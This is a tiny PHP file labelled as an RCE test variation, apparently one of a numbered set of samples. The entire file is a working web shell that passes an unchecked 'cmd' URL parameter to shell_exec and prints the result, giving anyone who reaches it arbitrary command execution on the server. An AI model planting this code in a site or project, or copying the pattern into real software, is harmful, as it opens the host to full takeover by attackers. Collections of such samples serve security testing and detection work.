<?php
// RCE test variation #1042
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>